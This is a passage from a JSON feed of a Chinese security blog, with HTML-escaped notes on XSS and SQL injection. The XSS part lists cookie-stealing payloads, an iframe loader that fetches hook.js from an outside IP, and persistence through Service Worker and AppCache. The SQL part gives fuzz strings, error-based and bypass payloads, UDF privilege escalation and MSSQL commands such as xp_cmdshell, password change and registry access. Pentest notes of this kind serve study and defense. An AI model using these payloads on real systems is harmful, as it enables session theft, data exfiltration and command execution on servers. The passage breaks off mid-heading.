t:prompt(document.cookie))\n&lt;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;\n![a'&quot;`onerror=prompt(document.cookie)](x)\n[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)\n[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)\n![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)\n</code></pre>\n<h2 id=\"iframe-2\"><a class=\"anchor\" href=\"#iframe-2\">#</a> iframe</h2>\n<pre><code>&lt;iframe onload='\n    var sc   = document.createElement(&quot;scr&quot; + &quot;ipt&quot;);\n    sc.type  = &quot;text/javascr&quot; + &quot;ipt&quot;;\n    sc.src   = &quot;http://1.2.3.4/js/hook.js&quot;;\n    document.body.appendChild(sc);\n    '\n/&gt;\n</code></pre>\n<ul>\n<li><code>&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=&quot;data:text/html,&lt;iframe src=javascript:alert('M')&gt;&lt;/iframe&gt;&quot;&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe srcdoc=&lt;svg/onload=alert(1)&gt;&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=https://baidu.com width=1366 height=768&gt;&lt;/iframe&gt;</code></li>\n<li><code>&lt;iframe src=javascript:alert(1) width=1366 height=768&gt;&lt;/iframe</code></li>\n</ul>\n<h2 id=\"form\"><a class=\"anchor\" href=\"#form\">#</a> form</h2>\n<ul>\n<li><code>&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;</code></li>\n<li><code>&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;M</code></li>\n<li><code>&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=M&gt;</code></li>\n<li><code>&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=M&gt;</code></li>\n<li><code>&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=1&gt;</code></li>\n</ul>\n<h2 id=\"meta\"><a class=\"anchor\" href=\"#meta\">#</a> meta</h2>\n<pre><code>&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;\n</code></pre>\n<h1 id=\"持久化\"><a class=\"anchor\" href=\"#持久化\">#</a> 持久化</h1>\n<h2 id=\"基于存储\"><a class=\"anchor\" href=\"#基于存储\">#</a> 基于存储</h2>\n<p>有时候网站会将信息存储在 Cookie 或 localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对 Cookie 或 localStorage 中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了 JSON 格式的数据时，部分站点存在  <code>eval(data)</code>  之类的调用。因此当有一个 XSS 时，可以把 payload 写入其中，在对应条件下触发。</p>\n<p>在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用  <code>String.fromCharCode</code>  来绕过。</p>\n<h2 id=\"service-worker\"><a class=\"anchor\" href=\"#service-worker\">#</a> Service Worker</h2>\n<p>Service Worker 可以拦截 http 请求，起到类似本地代理的作用，故可以使用 Service Worker Hook 一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。</p>\n<p>在 Chrome 中，可通过  <code>chrome://inspect/#service-workers</code>  来查看 Service Worker 的状态，并进行停止。</p>\n<h2 id=\"appcache\"><a class=\"anchor\" href=\"#appcache\">#</a> AppCache</h2>\n<p>在可控的网络环境下（公共 wifi），可以使用 AppCache 机制，来强制存储一些 Payload，未清除的情况下，用户访问站点时对应的 payload 会一直存在。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"wiki\"><a class=\"anchor\" href=\"#wiki\">#</a> wiki</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9Bd2Vzb21lWFNT\">AwesomeXSS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93M2MuZ2l0aHViLmlvL3dlYmFwcHNlYy1jc3Av\">w3c</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dpc2VjL2RvbXhzc3dpa2kvd2lraQ==\">dom xss wiki</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb250ZW50LXNlY3VyaXR5LXBvbGljeS5jb20v\">content-security-policy.com</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaHVicy5pby9leHBsb2l0aW5nLW1hcmtkb3duLXN5bnRheC1hbmQtdGVsZXNjb3BlLXBlcnNpc3RlbnQteHNzLXRocm91Z2gtbWFya2Rvd24tY3ZlLTIwMTQtNTE0NC8=\">markdwon xss</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9icnV0ZWxvZ2ljLmNvbS5ici9ibG9nL2NoZWF0LXNoZWV0Lw==\">xss cheat sheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9odG1sNXNlYy5vcmcv\">html5 security cheatsheet</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20vd2hpdGVwYXBlci1odHRwLXNlY3VyaXR5LWhlYWRlcnMv\">http security headers</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9YU1NDaGFsbGVuZ2VXaWtpL3dpa2k=\">XSSChallengeWiki</span></li>\n</ul>\n<h2 id=\"challenges\"><a class=\"anchor\" href=\"#challenges\">#</a> Challenges</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MtZ2FtZS5hcHBzcG90LmNvbS8=\">XSS Challenge By Google</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3Byb21wdC5tbC8w\">prompt to win</span></li>\n</ul>\n<h2 id=\"css-2\"><a class=\"anchor\" href=\"#css-2\">#</a> CSS</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy50aGVzcGFubmVyLmNvLnVrLzIwMTQvMDMvMjEvcnBvLw==\">rpo</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56amljbWlzYS5vcmcvaW5kZXgucGhwL2FyY2hpdmVzLzEyNy8=\">rpo 攻击初探</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdXJlc2VjLmNvbS9ibG9nL2FydGljbGUvYmxvZy9SZWFkaW5nLURhdGEtdmlhLUNTUy1JbmplY3Rpb24tMTgwLmh0bWw=\">Reading Data via CSS</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL21rc2Jlbi5sMC5jbS8yMDE1LzEwL2Nzcy1iYXNlZC1hdHRhY2stYWJ1c2luZy11bmljb2RlLXJhbmdlLmh0bWw=\">css based attack abusing unicode range</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vbG10X3N3YWxsb3cvY3NzLWluamVjdGlvbi1wbHVzLXBsdXMtamktY3VuLXNob3UtZmEtZmFsc2VnYWktZ3Vhbi10b2R1aS1jZQ==\">css injection</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnNoZWRkb3cueHl6L2Nzcy10aW1pbmctYXR0YWNrLw==\">css timing attack</span></li>\n</ul>\n<h2 id=\"同源策略-2\"><a class=\"anchor\" href=\"#同源策略-2\">#</a> 同源策略</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvU2VjdXJpdHkvU2FtZS1vcmlnaW5fcG9saWN5\">Same origin policy</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVkZWZlbmRlZC5jb20vcGFwZXJzL2NvcnMtc2VjdXJpdHktZ3VpZGU=\">cors security guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vc2hobmprL2xvZ2ljYWxseS1ieXBhc3NpbmctYnJvd3Nlci1zZWN1cml0eS1ib3VuZGFyaWVz\">logically bypassing browser security boundaries</span></li>\n</ul>\n<h2 id=\"bypass-2\"><a class=\"anchor\" href=\"#bypass-2\">#</a> bypass</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vSm9oYW5uZXNIb3BwZS81NjEyMjc0\">666 lines of xss payload</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hc2F0b2tpbnVnYXdhL2ZpbHRlcmJ5cGFzcw==\">xss auditor bypass</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vSFRNTC9jaHJvbWUteHNzLWF1ZGl0b3ItYnlwYXNzLWNvbGxlY3Rpb24uaHRtbA==\">xss auditor bypass writeup</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9ieXBhc3NpbmctY3NwLXVzaW5nLXBvbHlnbG90LWpwZWdz\">bypassing csp using polyglot jpegs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjanVpY2UuY29tL2J5cGFzcy14c3MtZmlsdGVycy11c2luZy1qYXZhc2NyaXB0LWdsb2JhbC12YXJpYWJsZXMv\">bypass xss filters using javascript global variables</span></li>\n</ul>\n<h2 id=\"持久化-2\"><a class=\"anchor\" href=\"#持久化-2\">#</a> 持久化</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Ryb3BzLndvb3l1bi5vcmcvd2ViLzEwNzk4\">变种 XSS 持久控制 by tig3r</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYWt1cml0eS5jb20vYmxvZy8yMDE1LzA4LzEzL21pZGRsZWtpdC5odG1s\">Using Appcache and ServiceWorker for Evil</span></li>\n</ul>\n<h2 id=\"tricks\"><a class=\"anchor\" href=\"#tricks\">#</a> Tricks</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V0aGVyZHJlYW0vc3ctc2Vj\">Service Worker 安全探索</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0V0aGVyRHJlYW0vd2ViLWZyb250ZW5kLW1hZ2lj\">前端黑魔法</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "XSS",
                "漏洞"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/",
            "title": "SQL注入",
            "date_published": "2022-11-26T03:05:09.000Z",
            "content_html": "<h1 id=\"注入分类\"><a class=\"anchor\" href=\"#注入分类\">#</a> 注入分类</h1>\n<h2 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h2>\n<p>SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。</p>\n<h2 id=\"按技巧分类\"><a class=\"anchor\" href=\"#按技巧分类\">#</a> 按技巧分类</h2>\n<p>根据使用的技巧，SQL 注入类型可分为</p>\n<ul>\n<li>\n<p>盲注</p>\n<ul>\n<li>布尔盲注：只能从应用返回中推断语句执行后的布尔值</li>\n<li>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</li>\n</ul>\n</li>\n<li>\n<p>报错注入：应用会显示全部或者部分的报错信息</p>\n</li>\n<li>\n<p>堆叠注入：有的应用可以加入  <code>;</code>  后一次执行多条语句</p>\n</li>\n<li>\n<p>其他</p>\n</li>\n</ul>\n<h2 id=\"按获取数据的方式分类\"><a class=\"anchor\" href=\"#按获取数据的方式分类\">#</a> 按获取数据的方式分类</h2>\n<p>另外也可以根据获取数据的方式分为 3 类</p>\n<h3 id=\"inband\"><a class=\"anchor\" href=\"#inband\">#</a> inband</h3>\n<p>利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。</p>\n<h3 id=\"inference\"><a class=\"anchor\" href=\"#inference\">#</a> inference</h3>\n<p>通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过 web 应用的其他改变来推断数据。</p>\n<h3 id=\"out-of-band-oob\"><a class=\"anchor\" href=\"#out-of-band-oob\">#</a> out of band (OOB)</h3>\n<p>通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。</p>\n<h1 id=\"注入检测\"><a class=\"anchor\" href=\"#注入检测\">#</a> 注入检测</h1>\n<h2 id=\"常见的注入点\"><a class=\"anchor\" href=\"#常见的注入点\">#</a> 常见的注入点</h2>\n<ul>\n<li>GET/POST/PUT/DELETE 参数</li>\n<li>X-Forwarded-For</li>\n<li>文件名</li>\n</ul>\n<h2 id=\"fuzz注入点\"><a class=\"anchor\" href=\"#fuzz注入点\">#</a> Fuzz 注入点</h2>\n<ul>\n<li><code>'</code>  /  <code>&quot;</code></li>\n<li><code>1/1</code></li>\n<li><code>1/0</code></li>\n<li><code>and 1=1</code></li>\n<li><code>&quot; and &quot;1&quot;=&quot;1</code></li>\n<li><code>and 1=2</code></li>\n<li><code>or 1=1</code></li>\n<li><code>or 1=</code></li>\n<li><code>' and '1'='1</code></li>\n<li><code>+</code>   <code>-</code>   <code>^</code>   <code>*</code>   <code>%</code>   <code>/</code></li>\n<li><code>&lt;&lt;</code>   <code>&gt;&gt;</code>   <code>||</code>   <code>|</code>   <code>&amp;</code>   <code>&amp;&amp;</code></li>\n<li><code>~</code></li>\n<li><code>!</code></li>\n<li><code>@</code></li>\n<li>反引号执行</li>\n</ul>\n<h2 id=\"测试用常量\"><a class=\"anchor\" href=\"#测试用常量\">#</a> 测试用常量</h2>\n<ul>\n<li><code>@@version</code></li>\n<li><code>@@servername</code></li>\n<li><code>@@language</code></li>\n<li><code>@@spid</code></li>\n</ul>\n<h2 id=\"测试列数\"><a class=\"anchor\" href=\"#测试列数\">#</a> 测试列数</h2>\n<p>例如  <code>http://www.foo.com/index.asp?id=12+union+select+null,null--</code>  ，不断增加  <code>null</code>  至不返回</p>\n<h2 id=\"报错注入\"><a class=\"anchor\" href=\"#报错注入\">#</a> 报错注入</h2>\n<ul>\n<li><code>select 1/0</code></li>\n<li><code>select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a</code></li>\n<li><code>extractvalue(1, concat(0x5c,(select user())))</code></li>\n<li><code>updatexml(0x3a,concat(1,(select user())),1)</code></li>\n<li><code>exp(~(SELECT * from(select user())a))</code></li>\n<li><code>ST_LatFromGeoHash((select * from(select * from(select user())a)b))</code></li>\n<li><code>GTID_SUBSET(version(), 1)</code></li>\n</ul>\n<h3 id=\"基于geometric的报错注入\"><a class=\"anchor\" href=\"#基于geometric的报错注入\">#</a> 基于 geometric 的报错注入</h3>\n<ul>\n<li><code>GeometryCollection((select * from (select * from(select user())a)b))</code></li>\n<li><code>polygon((select * from(select * from(select user())a)b))</code></li>\n<li><code>multipoint((select * from(select * from(select user())a)b))</code></li>\n<li><code>multilinestring((select * from(select * from(select user())a)b))</code></li>\n<li><code>LINESTRING((select * from(select * from(select user())a)b))</code></li>\n<li><code>multipolygon((select * from(select * from(select user())a)b))</code></li>\n</ul>\n<p>其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考这个 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvOTU4MjVmYTI4YTdlODRhMmY1ZGJkZWY1MjQxMDc4ZjcwNTVjNWIwNA==\">commit 95825f</span> 。</p>\n<p>而以上列表中基于 geometric 的报错注入在这个 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvNWNhZWE0YTk5NTEzMGNkN2M4MjU3NGFjYzU5MWZmN2M0NmQ5ZDk3OA==\">commit 5caea4</span> 中被修复，在 5.5.x 较后的版本中同样不再生效。</p>\n<h2 id=\"堆叠注入\"><a class=\"anchor\" href=\"#堆叠注入\">#</a> 堆叠注入</h2>\n<ul>\n<li><code>;select 1</code></li>\n</ul>\n<h2 id=\"注释符\"><a class=\"anchor\" href=\"#注释符\">#</a> 注释符</h2>\n<ul>\n<li><code>#</code></li>\n<li><code>--+</code></li>\n<li><code>/*xxx*/</code></li>\n<li><code>/*!xxx*/</code></li>\n<li><code>/*!50000xxx*/</code></li>\n</ul>\n<h2 id=\"判断过滤规则\"><a class=\"anchor\" href=\"#判断过滤规则\">#</a> 判断过滤规则</h2>\n<ul>\n<li>是否有 trunc</li>\n<li>是否过滤某个字符</li>\n<li>是否过滤关键字</li>\n<li>slash 和编码</li>\n</ul>\n<h2 id=\"获取信息\"><a class=\"anchor\" href=\"#获取信息\">#</a> 获取信息</h2>\n<ul>\n<li>\n<p>判断数据库类型</p>\n<ul>\n<li><code>and exists (select * from msysobjects ) &gt; 0</code>  access 数据库</li>\n<li><code>and exists (select * from sysobjects ) &gt; 0</code>  SQLServer 数据库</li>\n</ul>\n</li>\n<li>\n<p>判断数据库表</p>\n<ul>\n<li><code>and exsits (select * from admin)</code></li>\n</ul>\n</li>\n<li>\n<p>版本、主机名、用户名、库名</p>\n</li>\n<li>\n<p>表和字段</p>\n<ul>\n<li>\n<p>确定字段数</p>\n<ul>\n<li>\n<p>Order By</p>\n</li>\n<li>\n<p>Select Into</p>\n</li>\n</ul>\n</li>\n<li>\n<p>表名、列名</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"测试权限\"><a class=\"anchor\" href=\"#测试权限\">#</a> 测试权限</h2>\n<ul>\n<li>文件操作\n<ul>\n<li>读敏感文件</li>\n<li>写 shell</li>\n</ul>\n</li>\n<li>带外通道\n<ul>\n<li>网络请求</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h1>\n<h2 id=\"udf提权\"><a class=\"anchor\" href=\"#udf提权\">#</a> UDF 提权</h2>\n<p>UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为 MySQL 添加新函数，扩充其功能。</p>\n<p>当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。</p>\n<h1 id=\"数据库检测\"><a class=\"anchor\" href=\"#数据库检测\">#</a> 数据库检测</h1>\n<h2 id=\"mysql\"><a class=\"anchor\" href=\"#mysql\">#</a> MySQL</h2>\n<ul>\n<li>sleep  <code>sleep(1)</code></li>\n<li>benchmark  <code>BENCHMARK(5000000, MD5('test'))</code></li>\n<li>字符串连接\n<ul>\n<li><code>SELECT 'a' 'b'</code></li>\n<li><code>SELECT CONCAT('some','string')</code></li>\n</ul>\n</li>\n<li>version\n<ul>\n<li><code>SELECT @@version</code></li>\n<li><code>SELECT version()</code></li>\n</ul>\n</li>\n<li>识别用函数\n<ul>\n<li><code>connection_id()</code></li>\n<li><code>last_insert_id()</code></li>\n<li><code>row_count()</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"oracle\"><a class=\"anchor\" href=\"#oracle\">#</a> Oracle</h2>\n<ul>\n<li>字符串连接\n<ul>\n<li><code>'a'||'oracle' --</code></li>\n<li><code>SELECT CONCAT('some','string')</code></li>\n</ul>\n</li>\n<li>version\n<ul>\n<li><code>SELECT banner FROM v$version</code></li>\n<li><code>SELECT banner FROM v$version WHERE rownum=1</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"sqlserver\"><a class=\"anchor\" href=\"#sqlserver\">#</a> SQLServer</h2>\n<ul>\n<li>WAITFOR  <code>WAITFOR DELAY '00:00:10';</code></li>\n<li>SERVERNAME  <code>SELECT @@SERVERNAME</code></li>\n<li>version  <code>SELECT @@version</code></li>\n<li>字符串连接\n<ul>\n<li><code>SELECT 'some'+'string'</code></li>\n</ul>\n</li>\n<li>常量\n<ul>\n<li><code>@@pack_received</code></li>\n<li><code>@@rowcount</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"postgresql\"><a class=\"anchor\" href=\"#postgresql\">#</a> PostgreSQL</h2>\n<ul>\n<li>sleep  <code>pg_sleep(1)</code></li>\n</ul>\n<h1 id=\"绕过技巧\"><a class=\"anchor\" href=\"#绕过技巧\">#</a> 绕过技巧</h1>\n<ul>\n<li>\n<p>编码绕过</p>\n<ul>\n<li>大小写</li>\n<li>url 编码</li>\n<li>html 编码</li>\n<li>十六进制编码</li>\n<li>unicode 编码</li>\n</ul>\n</li>\n<li>\n<p>注释</p>\n<ul>\n<li><code>//</code>   <code>--</code>   <code>-- +</code>   <code>-- -</code>   <code>#</code>   <code>/**/</code>   <code>;%00</code></li>\n<li>内联注释用的更多，它有一个特性  <code>/!**/</code>  只有 MySQL 能识别</li>\n<li>e.g.  <code>index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</code></li>\n</ul>\n</li>\n<li>\n<p>只过滤了一次时</p>\n<ul>\n<li><code>union</code>  =&gt;  <code>ununionion</code></li>\n</ul>\n</li>\n<li>\n<p>相同功能替换</p>\n<ul>\n<li>函数替换\n<ul>\n<li><code>substring</code>  /  <code>mid</code>  /  <code>sub</code></li>\n<li><code>ascii</code>  /  <code>hex</code>  /  <code>bin</code></li>\n<li><code>benchmark</code>  /  <code>sleep</code></li>\n</ul>\n</li>\n<li>变量替换\n<ul>\n<li><code>user()</code>  /  <code>@@user</code></li>\n</ul>\n</li>\n<li>符号和关键字\n<ul>\n<li><code>and</code>  / `&amp;``</li>\n<li><code>or</code>  /  <code>|</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>HTTP 参数</p>\n<ul>\n<li>HTTP 参数污染\n<ul>\n<li><code>id=1&amp;id=2&amp;id=3</code>  根据容器不同会有不同的结果</li>\n</ul>\n</li>\n<li>HTTP 分割注入</li>\n</ul>\n</li>\n<li>\n<p>缓冲区溢出</p>\n<ul>\n<li>一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理</li>\n</ul>\n</li>\n<li>\n<p>二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过</p>\n</li>\n</ul>\n<h1 id=\"sql注入小技巧\"><a class=\"anchor\" href=\"#sql注入小技巧\">#</a> SQL 注入小技巧</h1>\n<h2 id=\"宽字节注入\"><a class=\"anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h2>\n<p>一般程序员用 gbk 编码做开发的时候，会用  <code>set names 'gbk'</code>  来设定，这句话等同于</p>\n<pre><code>set\ncharacter_set_connection = 'gbk',\ncharacter_set_result = 'gbk',\ncharacter_set_client = 'gbk';\n</code></pre>\n<p>漏洞发生的原因是执行了  <code>set character_set_client = 'gbk';</code>  之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用  <code>set names 'gbk'</code>  的话 real_escape 是不知道设置的数据的编码的，就会加  <code>%5c</code>  。此时 server 拿到数据解码 就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。</p>\n<p>解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是  <code>mysql_set_charset('gbk')</code>  ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。 第三种就是用 pdo。</p>\n<p>还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。</p>\n<h1 id=\"cheatsheet\"><a class=\"anchor\" href=\"#cheatsheet\">#</a> CheatSheet</h1>\n<h2 id=\"sql-server-payload\"><a class=\"anchor\" href=\"#sql-server-payload\">#</a> SQL Server Payload</h2>\n<h3 id=\"常见payload\"><a class=\"anchor\" href=\"#常见payload\">#</a> 常见 Payload</h3>\n<ul>\n<li>\n<p>Version</p>\n<ul>\n<li><code>SELECT @@version</code></li>\n<li><code>SELECT SERVERPROPERTY('Edition');</code></li>\n<li><code>SELECT SERVERPROPERTY('EngineEdition');</code></li>\n</ul>\n</li>\n<li>\n<p>Comment</p>\n<ul>\n<li><code>SELECT 1 -- comment</code></li>\n<li><code>SELECT /*comment*/1</code></li>\n</ul>\n</li>\n<li>\n<p>Space</p>\n<ul>\n<li><code>0x01 - 0x20</code></li>\n</ul>\n</li>\n<li>\n<p>用户信息</p>\n<ul>\n<li><code>SELECT user_name()</code></li>\n<li>``SELECT system_user`</li>\n<li><code>SELECT user</code></li>\n<li><code>SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</code></li>\n</ul>\n</li>\n<li>\n<p>用户权限</p>\n<ul>\n<li><code>select IS_SRVROLEMEMBER('sysadmin')</code></li>\n<li><code>select IS_SRVROLEMEMBER('db_owner')</code></li>\n</ul>\n</li>\n<li>\n<p>List User</p>\n<p><code>SELECT name FROM master..syslogins</code></p>\n</li>\n<li>\n<p>数据库信息</p>\n<ul>\n<li><code>SELECT name FROM master..sysdatabases</code></li>\n<li><code>select concat_ws(table_schema,table_name,column_name) from information_schema.columns</code></li>\n<li><code>select quotename(name) from master..sysdatabases FOR XML PATH('')</code></li>\n</ul>\n</li>\n<li>\n<p>执行命令</p>\n<ul>\n<li><code>EXEC xp_cmdshell 'net user'</code></li>\n</ul>\n</li>\n<li>\n<p>Ascii</p>\n<ul>\n<li><code>SELECT char(0x41)</code></li>\n<li><code>SELECT ascii('A')</code></li>\n<li><code>SELECT char(65)+char(66)</code>  =&gt; return  <code>AB</code></li>\n</ul>\n</li>\n<li>\n<p>Delay</p>\n<ul>\n<li><code>WAITFOR DELAY '0:0:3'</code>  pause for 3 seconds</li>\n</ul>\n</li>\n<li>\n<p>Change Password</p>\n<ul>\n<li><code>ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'</code></li>\n</ul>\n</li>\n<li>\n<p>Trick</p>\n<ul>\n<li><code>id=1 union:select password from:user</code></li>\n</ul>\n</li>\n<li>\n<p>文件读取</p>\n<ul>\n<li>OpenRowset</li>\n</ul>\n</li>\n<li>\n<p>当前查询语句</p>\n<ul>\n<li><code>select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)</code></li>\n</ul>\n</li>\n<li>\n<p>hostname</p>\n<ul>\n<li>用于判断是否站库分离</li>\n<li><code>select host_name()</code></li>\n<li><code>exec xp_getnetname</code></li>\n</ul>\n</li>\n<li>\n<p>服务器信息</p>\n<ul>\n<li><code>exec xp_msver</code></li>\n</ul>\n</li>\n<li>\n<p>系统配置</p>\n<ul>\n<li><code>select * from sys.configurations;</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"注册表读写\"><a class=\"anchor\" href=\"#注册表读写\">#</a> 注册表读写</h3>\n<ul>\n<li>\n<p><code>xp_regread</code></p>\n<ul>\n<li><code>exec xp_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\\CurrentControlSet\\Services\\MSSEARCH'</code></li>\n</ul>\n</li>\n<li>\n<p><code>xp_regwrite</code></p>\n</li>\n<li>\n<p><code>xp_regdeletvalue</code></p>\n</li>\n<li>\n<p><code>xp_regdeletkey</code></p>\n</li>\n<li>\n<p><code>xp_regaddmultistring</code></p>\n</li>\n</ul>\n<h3 id=\"报错注入-2\"><a class=\"anchor\" href=\"#报错注入-2\">#</a> 报错注入</h3>\n<ul>\n<li><code>1=convert(int,(db_name()))</code></li>\n</ul>\n<h3 id=\"常用函数\"><a class=\"anchor\" href=\"#常用函数\">#</a> 常用函数</h3>\n<ul>\n<li>SUSER_NAME()</li>\n<li>USER_NAME()</li>\n<li>PERMISSIONS()</li>\n<li>DB_NAME()</li>\n<li>FILE_NAME()</li>\n<li>TYPE_NAME()</li>\n<li>COL_NAME()</li>\n</ul>\n<h3 id=\"dns-oob\"><a class=\"anchor\" href=\"#dns-oob\">#</a> DNS OOB</h3>\n<ul>\n<li>fn_xe_file_target_read_file</li>\n<li>fn_get_audit_file</li>\n<li>fn_trace_gettable</li>\n</ul>\n<h3 id=\"其他常用存储过程\"><a class=\"anchor\" href=\"#其他常用存储过程\">#</a> 其他常用存储过程</h3>\n<ul>\n<li>sp_execute_external_script</li>\n<li>sp_makewebtask</li>\n<li>sp_OACreate</li>\n<li>sp_OADestroy</li>\n<li>sp_OAGetErrorInfo</li>\n<li>sp_OAGetProperty</li>\n<li>sp_OAMethod</li>\n<li>sp_OASetProperty</li>\n<li>sp_OAStop</li>\n<li>xp_cmdshell</li>\n<li>xp_dirtree</li>\n<li>xp_enumerrorlogs</li>\n<li>xp_enumgroups</li>\n<li>xp_fixeddrives</li>\n<li>xp_getfiledetails</li>\n<li>xp_loginconfig</li>\n</ul>\n<h2 id=\"mysql-payload\"><a class=\"anchor\" href=\"#mysql-payload\">#</a> MySQL Payload</h2>\n<h3 id=\"常见payload-2\"><a class=\"anchor\" href=\"#常见payload-2\">#</a> 常见 